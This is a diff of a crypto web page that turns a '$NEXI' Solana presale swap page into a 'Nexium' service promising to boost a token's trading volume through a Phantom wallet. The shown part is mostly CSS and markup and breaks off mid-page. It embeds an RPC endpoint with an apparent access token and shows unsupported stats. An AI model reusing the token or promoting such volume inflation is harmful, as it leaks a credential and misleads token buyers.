@@ -1,1019 +1,524 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="NEXI Token Presale - Get $NEXI before launch">
-    <title>$NEXI Token Presale - Powered by NexiumBoost</title>
-
-    <!-- UPDATED CSP: NEW QUICKNODE ENDPOINT ADDED -->
-    <meta http-equiv="Content-Security-Policy" content="
-      default-src 'self';
-      img-src 'self' https://nexium-bot.onrender.com data: https://i.ibb.co;
-      style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://cdn.tailwindcss.com;
-      font-src 'self' https://cdnjs.cloudflare.com;
-      script-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://cdnjs.cloudflare.com https://unpkg.com https://cdn.jsdelivr.net;
-      connect-src 'self' 
-        https://late-light-patron.solana-mainnet.quiknode.pro/60a7759b1bbb4567639fbabaca0fb63aedb556d6
-        https://public-api.solscan.io
-        https://api.coingecko.com;
-      frame-src 'self' https://phantom.app;
-    ">
-
-    <link rel="icon" type="image/png" href="/favicon.svg">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            background: linear-gradient(135deg, #0a0f1e 0%, #1a1535 50%, #0f1a2e 100%);
-            color: #ffffff;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            overflow-x: hidden;
-            min-height: 100vh;
-        }
-
-        /* Animated Background */
-        .bg-animation {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 0;
-            overflow: hidden;
-        }
-
-        .bg-animation::before,
-        .bg-animation::after {
-            content: '';
-            position: absolute;
-            width: 500px;
-            height: 500px;
-            border-radius: 50%;
-            filter: blur(100px);
-            opacity: 0.3;
-            animation: float 20s ease-in-out infinite;
-        }
-
-        .bg-animation::before {
-            background: #9945FF;
-            top: -250px;
-            left: -250px;
-            animation-delay: 0s;
-        }
-
-        .bg-animation::after {
-            background: #14F195;
-            bottom: -250px;
-            right: -250px;
-            animation-delay: 10s;
-        }
-
-        @keyframes float {
-            0%, 100% {
-                transform: translate(0, 0) scale(1);
-            }
-            33% {
-                transform: translate(100px, -100px) scale(1.1);
-            }
-            66% {
-                transform: translate(-100px, 100px) scale(0.9);
-            }
-        }
-
-        /* Solana Gradient */
-        .gradient-accent {
-            background: linear-gradient(135deg, #9945FF 0%, #14F195 50%, #00D4FF 100%);
-        }
-
-        .gradient-text {
-            background: linear-gradient(135deg, #9945FF 0%, #14F195 50%, #00D4FF 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-
-        /* Navigation */
-        nav {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            background: rgba(10, 15, 30, 0.8);
-            backdrop-filter: blur(20px);
-            padding: 1rem 2rem;
-            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.3);
-            z-index: 1000;
-            border-bottom: 1px solid rgba(153, 69, 255, 0.2);
-        }
-
-        .nav-container {
-            max-width: 1400px;
-            margin: 0 auto;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .logo-section {
-            display: flex;
-            align-items: center;
-            gap: 0.75rem;
-        }
-
-        .logo-section img {
-            width: 40px;
-            height: 40px;
-        }
-
-        .logo-text {
-            font-size: 1.5rem;
-            font-weight: 700;
-            background: linear-gradient(135deg, #9945FF 0%, #14F195 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        #connect-wallet {
-            background: linear-gradient(135deg, #9945FF 0%, #14F195 50%, #00D4FF 100%);
-            color: white;
-            border: none;
-            padding: 0.75rem 1.5rem;
-            border-radius: 12px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: transform 0.3s, box-shadow 0.3s;
-            box-shadow: 0 4px 20px rgba(153, 69, 255, 0.3);
-        }
-
-        #connect-wallet:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 30px rgba(153, 69, 255, 0.5);
-        }
-
-        /* Main Container */
-        .main-container {
-            position: relative;
-            z-index: 1;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 6rem 2rem 2rem;
-        }
-
-        .swap-container {
-            max-width: 600px;
-            width: 100%;
-        }
-
-        /* Hero Section */
-        .hero-section {
-            text-align: center;
-            margin-bottom: 3rem;
-            animation: fadeInDown 0.8s ease-out;
-        }
-
-        @keyframes fadeInDown {
-            from {
-                opacity: 0;
-                transform: translateY(-30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .hero-section h1 {
-            font-size: 3rem;
-            font-weight: 800;
-            margin-bottom: 1rem;
-            line-height: 1.2;
-        }
-
-        .hero-section .subtitle {
-            font-size: 1.2rem;
-            color: #a0a0a0;
-            margin-bottom: 2rem;
-        }
-
-        .presale-badge {
-            display: inline-block;
-            padding: 0.5rem 1.5rem;
-            background: rgba(153, 69, 255, 0.2);
-            border: 2px solid #9945FF;
-            border-radius: 50px;
-            font-weight: 600;
-            color: #14F195;
-            margin-bottom: 2rem;
-            animation: pulse 2s ease-in-out infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% {
-                transform: scale(1);
-                box-shadow: 0 0 0 0 rgba(153, 69, 255, 0.7);
-            }
-            50% {
-                transform: scale(1.05);
-                box-shadow: 0 0 0 10px rgba(153, 69, 255, 0);
-            }
-        }
-
-        /* Swap Card */
-        .swap-card {
-            background: rgba(26, 21, 53, 0.6);
-            backdrop-filter: blur(20px);
-            border-radius: 24px;
-            padding: 2.5rem;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
-            border: 1px solid rgba(153, 69, 255, 0.3);
-            animation: fadeInUp 0.8s ease-out 0.2s backwards;
-        }
-
-        @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .card-header {
-            text-align: center;
-            margin-bottom: 2rem;
-        }
-
-        .card-header h2 {
-            font-size: 1.8rem;
-            font-weight: 700;
-            margin-bottom: 0.5rem;
-        }
-
-        .card-header p {
-            color: #a0a0a0;
-            font-size: 0.95rem;
-        }
-
-        /* Input Section */
-        .input-section {
-            background: rgba(15, 26, 46, 0.8);
-            border-radius: 16px;
-            padding: 1.5rem;
-            margin-bottom: 1.5rem;
-            border: 2px solid rgba(153, 69, 255, 0.2);
-            transition: border-color 0.3s;
-        }
-
-        .input-section:focus-within {
-            border-color: #9945FF;
-        }
-
-        .input-label {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 0.75rem;
-            color: #a0a0a0;
-            font-size: 0.9rem;
-        }
-
-        .input-wrapper {
-            display: flex;
-            align-items: center;
-            gap: 1rem;
-        }
-
-        .input-wrapper input {
-            flex: 1;
-            background: transparent;
-            border: none;
-            color: white;
-            font-size: 2rem;
-            font-weight: 600;
-            outline: none;
-            width: 100%;
-        }
-
-        .input-wrapper input::placeholder {
-            color: rgba(255, 255, 255, 0.3);
-        }
-
-        .token-badge {
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-            padding: 0.5rem 1rem;
-            background: rgba(153, 69, 255, 0.3);
-            border-radius: 12px;
-            font-weight: 600;
-            white-space: nowrap;
-        }
-
-        .token-icon {
-            width: 24px;
-            height: 24px;
-            border-radius: 50%;
-            background: linear-gradient(135deg, #9945FF 0%, #14F195 100%);
-        }
-
-        /* Quick Amount Buttons */
-        .quick-amounts {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 0.5rem;
-            margin-top: 1rem;
-        }
-
-        .quick-btn {
-            padding: 0.5rem;
-            background: rgba(153, 69, 255, 0.2);
-            border: 1px solid rgba(153, 69, 255, 0.4);
-            color: #14F195;
-            border-radius: 8px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s;
-            font-size: 0.9rem;
-        }
-
-        .quick-btn:hover {
-            background: rgba(153, 69, 255, 0.4);
-            border-color: #9945FF;
-            transform: translateY(-2px);
-        }
-
-        /* Swap Arrow */
-        .swap-arrow {
-            text-align: center;
-            margin: -0.5rem 0;
-            position: relative;
-            z-index: 2;
-        }
-
-        .arrow-icon {
-            display: inline-flex;
-            width: 40px;
-            height: 40px;
-            background: rgba(153, 69, 255, 0.3);
-            border: 2px solid #9945FF;
-            border-radius: 50%;
-            align-items: center;
-            justify-content: center;
-            color: #14F195;
-            font-size: 1.2rem;
-        }
-
-        /* Rate Info */
-        .rate-info {
-            background: rgba(20, 241, 149, 0.1);
-            border: 1px solid rgba(20, 241, 149, 0.3);
-            border-radius: 12px;
-            padding: 1rem;
-            margin-bottom: 1.5rem;
-            text-align: center;
-        }
-
-        .rate-info .rate {
-            font-size: 1.1rem;
-            font-weight: 600;
-            color: #14F195;
-        }
-
-        .rate-info .rate-label {
-            font-size: 0.85rem;
-            color: #a0a0a0;
-            margin-top: 0.25rem;
-        }
-
-        /* Limits Info */
-        .limits-info {
-            display: flex;
-            justify-content: space-between;
-            padding: 1rem;
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 12px;
-            margin-bottom: 1.5rem;
-            font-size: 0.9rem;
-        }
-
-        .limit-item {
-            display: flex;
-            flex-direction: column;
-            gap: 0.25rem;
-        }
-
-        .limit-label {
-            color: #a0a0a0;
-        }
-
-        .limit-value {
-            color: #14F195;
-            font-weight: 600;
-        }
-
-        /* Swap Button */
-        .swap-button {
-            width: 100%;
-            background: linear-gradient(135deg, #9945FF 0%, #14F195 50%, #00D4FF 100%);
-            color: white;
-            border: none;
-            padding: 1.25rem;
-            border-radius: 16px;
-            font-weight: 700;
-            font-size: 1.2rem;
-            cursor: pointer;
-            transition: all 0.3s;
-            box-shadow: 0 8px 30px rgba(153, 69, 255, 0.4);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .swap-button:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 12px 40px rgba(153, 69, 255, 0.6);
-        }
-
-        .swap-button:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-
-        .swap-button::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
-            transition: left 0.5s;
-        }
-
-        .swap-button:hover:not(:disabled)::before {
-            left: 100%;
-        }
-
-        /* Stats Grid */
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 1rem;
-            margin-top: 2rem;
-            animation: fadeInUp 0.8s ease-out 0.4s backwards;
-        }
-
-        .stat-card {
-            background: rgba(26, 21, 53, 0.6);
-            backdrop-filter: blur(20px);
-            border-radius: 16px;
-            padding: 1.5rem;
-            text-align: center;
-            border: 1px solid rgba(153, 69, 255, 0.2);
-        }
-
-        .stat-value {
-            font-size: 1.5rem;
-            font-weight: 700;
-            color: #14F195;
-            margin-bottom: 0.5rem;
-        }
-
-        .stat-label {
-            font-size: 0.85rem;
-            color: #a0a0a0;
-        }
-
-        /* Wallet Modal */
-        .wallet-modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            z-index: 2000;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .wallet-modal.active {
-            display: flex;
-        }
-
-        .modal-content {
-            background: linear-gradient(135deg, #1a1535 0%, #0f1a2e 100%);
-            border-radius: 24px;
-            padding: 2.5rem;
-            width: 90%;
-            max-width: 450px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
-            border: 1px solid rgba(153, 69, 255, 0.3);
-            animation: modalSlideIn 0.3s ease-out;
-        }
-
-        @keyframes modalSlideIn {
-            from {
-                opacity: 0;
-                transform: scale(0.9) translateY(-20px);
-            }
-            to {
-                opacity: 1;
-                transform: scale(1) translateY(0);
-            }
-        }
-
-        .modal-content h2 {
-            color: #ffffff;
-            font-size: 1.8rem;
-            margin-bottom: 1.5rem;
-            text-align: center;
-        }
-
-        .wallet-option {
-            display: flex;
-            align-items: center;
-            gap: 1rem;
-            padding: 1.25rem;
-            margin: 1rem 0;
-            background: rgba(153, 69, 255, 0.1);
-            border-radius: 16px;
-            cursor: pointer;
-            transition: all 0.3s;
-            border: 2px solid rgba(153, 69, 255, 0.3);
-        }
-
-        .wallet-option:hover {
-            background: rgba(153, 69, 255, 0.2);
-            border-color: #9945FF;
-            transform: translateX(5px);
-        }
-
-        .wallet-option.disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            filter: grayscale(1);
-        }
-
-        .wallet-option.disabled:hover {
-            transform: none;
-        }
-
-        .wallet-icon {
-            width: 50px;
-            height: 50px;
-            border-radius: 12px;
-            background: linear-gradient(135deg, #9945FF 0%, #14F195 100%);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-size: 1.5rem;
-        }
-
-        .close-modal {
-            width: 100%;
-            padding: 1rem;
-            background: rgba(255, 255, 255, 0.1);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 12px;
-            margin-top: 1rem;
-            cursor: pointer;
-            font-weight: 600;
-            color: white;
-            transition: all 0.3s;
-        }
-
-        .close-modal:hover {
-            background: rgba(255, 255, 255, 0.15);
-        }
-
-        /* MetaMask Prompt */
-        #metamaskPrompt {
-            display: none;
-            position: fixed;
-            bottom: 2rem;
-            right: 2rem;
-            background: linear-gradient(135deg, #1a1535 0%, #0f1a2e 100%);
-            padding: 1.5rem;
-            border-radius: 16px;
-            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.5);
-            max-width: 320px;
-            z-index: 1000;
-            text-align: center;
-            color: #ffffff;
-            border: 1px solid rgba(153, 69, 255, 0.3);
-        }
-
-        #metamaskPrompt.active {
-            display: block;
-            animation: slideInRight 0.3s ease-out;
-        }
-
-        @keyframes slideInRight {
-            from {
-                opacity: 0;
-                transform: translateX(100px);
-            }
-            to {
-                opacity: 1;
-                transform: translateX(0);
-            }
-        }
-
-        #metamaskPrompt .prompt-close {
-            background: rgba(153, 69, 255, 0.3);
-            border: 1px solid #9945FF;
-            padding: 0.5rem 1rem;
-            border-radius: 8px;
-            cursor: pointer;
-            margin-top: 0.75rem;
-            color: white;
-            font-weight: 600;
-            transition: all 0.3s;
-        }
-
-        #metamaskPrompt .prompt-close:hover {
-            background: rgba(153, 69, 255, 0.5);
-        }
-
-        /* Error Message */
-        .error-message {
-            background: rgba(255, 59, 48, 0.2);
-            border: 1px solid rgba(255, 59, 48, 0.5);
-            color: #ff3b30;
-            padding: 1rem;
-            border-radius: 12px;
-            margin-top: 1rem;
-            text-align: center;
-            display: none;
-        }
-
-        .error-message.active {
-            display: block;
-            animation: shake 0.5s ease-in-out;
-        }
-
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-10px); }
-            75% { transform: translateX(10px); }
-        }
-
-        /* Responsive */
-        @media (max-width: 768px) {
-            .hero-section h1 {
-                font-size: 2rem;
-            }
-
-            .hero-section .subtitle {
-                font-size: 1rem;
-            }
-
-            .swap-card {
-                padding: 1.5rem;
-            }
-
-            .input-wrapper input {
-                font-size: 1.5rem;
-            }
-
-            .stats-grid {
-                grid-template-columns: 1fr;
-            }
-
-            .quick-amounts {
-                grid-template-columns: repeat(2, 1fr);
-            }
-
-            .main-container {
-                padding: 5rem 1rem 1rem;
-            }
-        }
-
-        @media (prefers-reduced-motion: reduce) {
-            * {
-                animation: none !important;
-                transition: none !important;
-            }
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="Nexium - Boost your token volume instantly with Phantom wallet" />
+  <title>Nexium - Boost Volume</title>
+
+  <!-- SECURITY -->
+  <meta http-equiv="Content-Security-Policy" content="
+    default-src 'self';
+    script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net;
+    connect-src 'self' https://late-light-patron.solana-mainnet.quiknode.pro/60a7759b1bbb4567639fbabaca0fb63aedb556d6;
+    style-src 'self' 'unsafe-inline';
+    font-src 'self';
+  ">
+
+  <!-- POLYFILL -->
+  <script type="module">
+    import { Buffer } from 'https://cdn.jsdelivr.net/npm/buffer@6.0.3/index.js';
+    globalThis.Buffer = Buffer;
+    window.Buffer = Buffer;
+  </script>
+
+  <style>
+    /* ===== RESET & BASE ===== */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    :root {
+      --bg: #0a0814;
+      --card: #1f1d35;
+      --text: #fff;
+      --text-muted: #a8a8b3;
+      --accent: #ff9800;
+      --accent-light: #ffc107;
+      --success: #4caf50;
+      --error: #f44336;
+      --border: rgba(255, 152, 0, 0.3);
+      --shadow: 0 10px 40px rgba(255, 152, 0, 0.1);
+      --transition: all 0.3s ease;
+      --radius: 16px;
+    }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      min-height: 100vh;
+      line-height: 1.6;
+    }
+
+    /* ===== NAV ===== */
+    .nav {
+      padding: 1.5rem 2rem;
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+      backdrop-filter: blur(10px);
+      background: rgba(10, 8, 20, 0.8);
+      border-bottom: 1px solid var(--border);
+    }
+    .nav-container {
+      max-width: 1200px;
+      margin: 0 auto;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .logo-text {
+      font-size: 1.8rem;
+      font-weight: 800;
+      background: linear-gradient(135deg, #ff9800, #ffc107);
+      -webkit-background-clip: text;
+      background-clip: text;
+      -webkit-text-fill-color: transparent;
+      text-fill-color: transparent;
+      user-select: none;
+    }
+
+    /* ===== HERO ===== */
+    .hero {
+      padding: 4rem 2rem;
+      text-align: center;
+    }
+    .hero-container {
+      max-width: 800px;
+      margin: 0 auto;
+    }
+    .hero-title {
+      font-size: 3.5rem;
+      font-weight: 800;
+      margin-bottom: 1rem;
+      line-height: 1.2;
+    }
+    .gradient-text {
+      background: linear-gradient(135deg, #ff9800, #ffc107);
+      -webkit-background-clip: text;
+      background-clip: text;
+      -webkit-text-fill-color: transparent;
+      text-fill-color: transparent;
+    }
+    .hero-subtitle { font-size: 1.5rem; color: var(--text-muted); margin-bottom: 2rem; }
+    .hero-stats {
+      display: flex;
+      justify-content: center;
+      gap: 3rem;
+      margin: 3rem 0;
+      flex-wrap: wrap;
+    }
+    .stat-item { text-align: center; }
+    .stat-value { font-size: 2rem; font-weight: 700; color: var(--accent); }
+    .stat-label { color: var(--text-muted); font-size: 0.9rem; }
+
+    /* ===== FLOATING CARDS ===== */
+    .floating-cards {
+      display: flex;
+      justify-content: center;
+      gap: 1.5rem;
+      margin: 3rem 0;
+      flex-wrap: wrap;
+    }
+    .floating-card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 1.5rem;
+      width: 180px;
+      text-align: center;
+      box-shadow: var(--shadow);
+      animation: float 6s ease-in-out infinite;
+    }
+    .floating-card:nth-child(2) { animation-delay: 2s; }
+    .floating-card:nth-child(3) { animation-delay: 4s; }
+    .card-icon {
+      width: 48px; height: 48px; margin: 0 auto 1rem;
+      background: rgba(255, 152, 0, 0.1);
+      border-radius: 12px;
+      display: flex; align-items: center; justify-content: center;
+    }
+    .card-icon svg { width: 28px; height: 28px; stroke: var(--accent); }
+    .card-text { font-weight: 600; font-size: 1rem; }
+
+    /* ===== BUTTONS ===== */
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+      padding: 1rem 2rem;
+      font-weight: 600;
+      border-radius: 12px;
+      border: none;
+      cursor: pointer;
+      transition: var(--transition);
+      font-size: 1.1rem;
+      position: relative;
+      overflow: hidden;
+    }
+    .btn-primary {
+      background: linear-gradient(135deg, #ff9800, #ffc107);
+      color: #000;
+      box-shadow: 0 4px 15px rgba(255, 152, 0, 0.3);
+    }
+    .btn-primary:hover:not(:disabled) {
+      transform: translateY(-3px);
+      box-shadow: 0 8px 25px rgba(255, 152, 0, 0.4);
+    }
+    .btn-large { padding: 1.25rem 3rem; font-size: 1.2rem; }
+    .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+
+    /* ===== MODAL ===== */
+    .modal {
+      position: fixed; inset: 0; background: rgba(0,0,0,0.85);
+      backdrop-filter: blur(8px); display: none; align-items: center; justify-content: center;
+      z-index: 1000; padding: 1rem;
+    }
+    .modal.active { display: flex; }
+    .modal-content {
+      background: var(--card); border: 1px solid var(--border);
+      border-radius: 20px; padding: 2rem; width: 100%; max-width: 420px;
+      animation: slideUp 0.4s ease;
+    }
+    .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1.5rem; }
+    .modal-title { font-size: 1.6rem; font-weight: 700; }
+    .modal-close {
+      background: none; border: none; color: var(--text-muted); font-size: 1.8rem;
+      cursor: pointer; width: 36px; height: 36px; display: flex; align-items: center; justify-content: center;
+    }
+    .modal-close:hover { color: var(--accent); transform: rotate(90deg); }
+
+    /* ===== PHANTOM BUTTON ===== */
+    #connect-phantom {
+      display: flex; align-items: center; gap: 1rem; padding: 1.5rem;
+      background: #1a182e; border: 2px solid var(--border); border-radius: 12px;
+      cursor: pointer; transition: var(--transition); font-weight: 600; font-size: 1.1rem;
+    }
+    #connect-phantom:hover {
+      border-color: var(--accent); transform: translateY(-2px); box-shadow: var(--shadow);
+    }
+    .wallet-icon {
+      width: 56px; height: 56px; border-radius: 12px;
+      display: flex; align-items: center; justify-content: center;
+      background: rgba(255, 255, 255, 0.05);
+    }
+    .wallet-icon svg { width: 44px; height: 44px; }
+
+    /* ===== BOOST SECTION ===== */
+    .boost-section {
+      background: var(--card); border: 1px solid var(--border);
+      border-radius: 20px; padding: 2.5rem; margin: 3rem auto; max-width: 500px;
+      display: none;
+    }
+    .boost-section.visible { display: block; animation: fadeInUp 0.6s ease; }
+    .input-group { margin-bottom: 1.5rem; text-align: left; }
+    .input-label {
+      display: block; font-size: 0.875rem; color: var(--text-muted);
+      margin-bottom: 0.5rem; text-transform: uppercase; letter-spacing: 1px; font-weight: 600;
+    }
+    .input-wrapper { position: relative; }
+    .currency {
+      position: absolute; left: 1.25rem; top: 50%; transform: translateY(-50%);
+      font-size: 1.5rem; color: var(--accent); font-weight: 600; pointer-events: none;
+    }
+    input[type="text"], input[type="number"] {
+      width: 100%; padding: 1rem 1rem 1rem 3rem; background: #1a182e;
+      border: 2px solid var(--border); border-radius: 12px; color: var(--text);
+      font-size: 1.1rem; transition: var(--transition);
+    }
+    input:focus {
+      outline: none; border-color: var(--accent);
+      box-shadow: 0 0 0 4px rgba(255, 152, 0, 0.1);
+    }
+    .input-hint { margin-top: 0.5rem; font-size: 0.875rem; color: var(--text-muted); }
+
+    .network-info {
+      background: #1a182e; border-radius: 12px; padding: 1.5rem;
+      margin: 2rem 0; display: grid; grid-template-columns: 1fr 1fr; gap: 1rem;
+    }
+    .info-label { color: var(--text-muted); font-weight: 600; text-transform: uppercase; letter-spacing: 1px; }
+    .info-value { color: var(--text); font-weight: 600; }
+
+    /* ===== FEEDBACK ===== */
+    .feedback-container {
+      position: fixed; bottom: 1rem; right: 1rem; z-index: 9999;
+      display: flex; flex-direction: column; gap: 0.75rem; max-width: 380px;
+    }
+    .feedback {
+      background: var(--success); color: white; padding: 1rem 1.5rem;
+      border-radius: 12px; display: flex; align-items: center; justify-content: space-between;
+      gap: 1rem; box-shadow: var(--shadow); animation: slideIn 0.3s ease;
+    }
+    .feedback.error { background: var(--error); }
+    .feedback-close {
+      background: none; border: none; color: white; font-size: 1.5rem;
+      cursor: pointer; opacity: 0.8;
+    }
+    .feedback-close:hover { opacity: 1; }
+
+    /* ===== FOOTER ===== */
+    .footer {
+      text-align: center; padding: 3rem 2rem; color: var(--text-muted); font-size: 0.9rem;
+      border-top: 1px solid var(--border); margin-top: 4rem;
+    }
+    .footer-links { margin-top: 1rem; }
+    .footer-link { color: var(--text-muted); text-decoration: none; margin: 0 1rem; }
+    .footer-link:hover { color: var(--accent); }
+
+    /* ===== ANIMATIONS ===== */
+    @keyframes slideUp { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+    @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+    @keyframes slideIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+    @keyframes float {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-15px); }
+    }
+
+    /* ===== RESPONSIVE ===== */
+    @media (max-width: 768px) {
+      .hero-title { font-size: 2.5rem; }
+      .hero-stats { gap: 1.5rem; }
+      .boost-section, .modal-content { padding: 1.5rem; }
+    }
+  </style>
 </head>
 <body>
-    <div class="bg-animation"></div>
 
-    <!-- Navigation -->
-    <nav>
-        <div class="nav-container">
-            <div class="logo-section">
-                <img src="/logo.png" alt="NexiumBoost Logo" onerror="this.style.display='none'">
-                <span class="logo-text">NexiumBoost</span>
-            </div>
-            <button id="connect-wallet" aria-label="Connect Wallet">Connect Phantom</button>
+  <!-- NAV -->
+  <nav class="nav">
+    <div class="nav-container">
+      <div class="logo-text">NEXIUM</div>
+    </div>
+  </nav>
+
+  <!-- HERO -->
+  <section class="hero">
+    <div class="hero-container">
+      <h1 class="hero-title">
+        <span class="gradient-text">Boost Your Token</span>
+        <br><span class="hero-subtitle">Volume Instantly</span>
+      </h1>
+      <p class="hero-description">
+        Connect your Phantom wallet and amplify your token's trading volume in seconds.
+      </p>
+
+      <div class="hero-stats">
+        <div class="stat-item">
+          <div class="stat-value">$1M+</div>
+          <div class="stat-label">Volume Boosted</div>
         </div>
-    </nav>
-
-    <!-- Main Container -->
-    <div class="main-container">
-        <div class="swap-container">
-            <!-- Hero Section -->
-            <div class="hero-section">
-                <div class="presale-badge">PRESALE LIVE</div>
-                <h1>
-                    Get <span class="gradient-text">$NEXI</span><br>
-                    Before Launch
-                </h1>
-                <p class="subtitle">
-                    Exclusive presale opportunity on Solana. Limited time only.
-                </p>
-            </div>
-
-            <!-- Swap Card -->
-            <div class="swap-card">
-                <div class="card-header">
-                    <h2>Swap to $NEXI</h2>
-                    <p>Exchange SOL for $NEXI tokens at presale rates</p>
-                </div>
-
-                <!-- You Pay Section -->
-                <div class="input-section">
-                    <div class="input-label">
-                        <span>You Pay</span>
-                        <span>Balance: 0.00 SOL</span>
-                    </div>
-                    <div class="input-wrapper">
-                        <input 
-                            type="number" 
-                            id="input-amount" 
-                            placeholder="0.00" 
-                            min="1" 
-                            max="10000"
-                            step="0.01"
-                        />
-                        <div class="token-badge">
-                            <div class="token-icon"></div>
-                            <span>SOL</span>
-                        </div>
-                    </div>
-                    <div class="quick-amounts">
-                        <button class="quick-btn" data-amount="1">$1</button>
-                        <button class="quick-btn" data-amount="10">$10</button>
-                        <button class="quick-btn" data-amount="100">$100</button>
-                        <button class="quick-btn" data-amount="1000">$1,000</button>
-                    </div>
-                </div>
-
-                <!-- Swap Arrow -->
-                <div class="swap-arrow">
-                    <div class="arrow-icon">
-                        <i class="fas fa-arrow-down"></i>
-                    </div>
-                </div>
-
-                <!-- You Receive Section -->
-                <div class="input-section">
-                    <div class="input-label">
-                        <span>You Receive</span>
-                        <span>$NEXI Tokens</span>
-                    </div>
-                    <div class="input-wrapper">
-                        <input 
-                            type="text" 
-                            id="output-amount" 
-                            placeholder="0.00" 
-                            readonly
-                            style="cursor: default;"
-                        />
-                        <div class="token-badge">
-                            <div class="token-icon"></div>
-                            <span>$NEXI</span>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Rate Info -->
-                <div class="rate-info">
-                    <div class="rate">1 USD = 100 $NEXI</div>
-                    <div class="rate-label">Presale Exchange Rate</div>
-                </div>
-
-                <!-- Limits Info -->
-                <div class="limits-info">
-                    <div class="limit-item">
-                        <span class="limit-label">Minimum</span>
-                        <span class="limit-value">$1 USD</span>
-                    </div>
-                    <div class="limit-item">
-                        <span class="limit-label">Maximum</span>
-                        <span class="limit-value">$10,000 USD</span>
-                    </div>
-                    <div class="limit-item">
-                        <span class="limit-label">Your Allocation</span>
-                        <span class="limit-value" id="user-allocation">0 $NEXI</span>
-                    </div>
-                </div>
-
-                <!-- Swap Button -->
-                <button class="swap-button" id="swap-button" disabled>
-                    Connect Wallet to Swap
-                </button>
-
-                <!-- Error Message -->
-                <div class="error-message" id="error-message"></div>
-            </div>
-
-            <!-- Stats Grid -->
-            <div class="stats-grid">
-                <div class="stat-card">
-                    <div class="stat-value">100:1</div>
-                    <div class="stat-label">Exchange Rate</div>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-value">Solana</div>
-                    <div class="stat-label">Blockchain</div>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-value">Instant</div>
-                    <div class="stat-label">Settlement</div>
-                </div>
-            </div>
+        <div class="stat-item">
+          <div class="stat-value">500+</div>
+          <div class="stat-label">Active Users</div>
         </div>
+        <div class="stat-item">
+          <div class="stat-value">24/7</div>
+          <div class="stat-label">Support</div>
+        </div>
+      </div>
+
+      <button id="connect-wallet" class="btn btn-primary btn-large">
+        Connect Wallet
+      </button>
+
+      <!-- FLOATING CARDS -->
+      <div class="floating-cards">
+        <div class="floating-card">
+          <div class="card-icon">
+            <svg><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
+          </div>
